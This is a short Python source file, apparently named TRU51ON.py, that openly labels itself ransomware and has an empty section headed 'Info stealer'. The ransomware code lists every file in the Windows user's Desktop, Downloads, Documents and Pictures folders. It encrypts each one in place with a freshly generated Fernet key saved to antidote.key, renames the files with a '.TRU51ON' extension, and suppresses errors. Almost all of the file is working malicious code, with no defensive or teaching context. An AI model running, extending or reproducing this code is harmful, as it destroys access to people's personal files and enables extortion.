# Import modules
import os
from cryptography.fernet import Fernet

## Info stealer ##


## Ransomware ##
# Get the paths for Desktop, Downloads, Documents and Pictures
userprofile = os.environ.get("USERPROFILE")
desktop = os.path.join(userprofile, "Desktop")
downloads = os.path.join(userprofile, "Downloads")
documents = os.path.join(userprofile, "Documents")
pictures = os.path.join(userprofile, "Pictures")

# List of directories to search
directories = [desktop, downloads, documents, pictures]

# List all files in the current directory except for TRU51ON.py and antidote.key
files = []
for directory in directories:
    for file in os.listdir(directory):
        if os.path.isfile(os.path.join(directory, file)):
            if file == "TRU51ON.py" or file == 'antidote.key':
                continue
            else:
                files.append(os.path.join(directory, file))

print(files)

# Generate the decryption key and save it to antidote.key
key = Fernet.generate_key()
with open('antidote.key', 'wb') as antidote:
    antidote.write(key)

# Encrypt the files one by one
for file in files:
    try:
        with open(file, 'rb') as f:
            content = f.read()
        content_encrypted = Fernet(key).encrypt(content)
        with open(file, 'wb') as f:
            f.write(content_encrypted)
        os.rename(file, file + '.TRU51ON')
    except:
        pass